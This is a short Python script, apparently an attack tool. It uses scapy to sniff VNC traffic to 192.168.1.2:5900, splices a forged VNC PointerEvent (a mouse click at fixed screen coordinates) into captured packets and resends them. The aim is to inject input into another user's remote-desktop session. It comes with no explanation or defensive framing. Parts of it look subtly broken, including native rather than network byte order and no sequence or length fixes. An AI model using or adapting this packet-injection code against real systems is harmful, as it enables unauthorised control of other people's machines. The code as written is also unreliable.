import struct
import socket
from scapy.all import *

def inject_pointer_event(packet):
	def create_vnc_pointer_event(button_mask, x_position, y_position):
		message_type = 0x05
		packet = struct.pack('BBHH', message_type, button_mask, x_position, y_position)
		return packet
	
	button_mask = 0x01
	x_position = 184
	y_position = 486
	
	vnc_pointer_event = create_vnc_pointer_event(button_mask, x_position, y_position)
	
	print(packet)

	packet[TCP].payload = Raw(load=vnc_pointer_event) / packet[TCP].payload[4:]
	del packet[TCP].chksum
	
	send(packet)
	
#def send_vnc_packet(host, port, packet):
#	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
#		s.connect((host, port))
#		s.sendall(packet)

#host = '192.168.1.2'
#port = 5900

# send_vnc_packet(host, port, packet)

sniff(filter="tcp and host 192.168.1.2 and port 5900", prn=inject_pointer_event) 
